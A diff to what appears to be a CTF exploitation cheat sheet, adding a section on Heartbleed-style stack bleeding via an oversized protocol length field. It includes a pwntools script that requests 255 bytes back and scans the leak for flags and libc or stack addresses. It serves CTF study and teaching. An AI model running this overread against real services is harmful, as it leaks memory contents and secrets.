@@ -14,6 +14,7 @@
 - [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
 - [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
+- [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
 
 ---
 
@@ -303,3 +304,40 @@ p.sendline(payload)
 ## Global Buffer Overflow (CSV Injection)
 
 **Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.
+
+---
+
+## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)
+
+Custom network protocols that echo data based on a length field in the request header can leak stack memory when the length exceeds the actual data sent (similar to Heartbleed).
+
+```python
+from pwn import *
+
+# Custom protocol: [4-byte magic][1-byte length][payload]
+# Server echoes back `length` bytes of the response buffer
+# If length > actual payload, server leaks stack/heap memory
+
+io = remote('target.ctf', 1337)
+
+# Normal request: 5 bytes of data, length = 5
+# Bleeding request: 5 bytes of data, length = 255
+magic = b'\x00\x01\x02\x03'
+length_field = b'\xff'  # request 255 bytes back
+payload = b'AAAAA'      # only send 5 bytes
+
+io.send(magic + length_field + payload)
+leaked = io.recv(255)
+
+# Search leaked memory for flag pattern
+if b'flag{' in leaked or b'CTF{' in leaked:
+    log.success(f"Flag found in leaked data!")
+
+# Alternatively, search for addresses (libc pointers, stack addresses)
+for i in range(0, len(leaked) - 8, 8):
+    addr = u64(leaked[i:i+8])
+    if 0x7f0000000000 < addr < 0x7fffffffffff:
+        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
+```
+
+**Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.
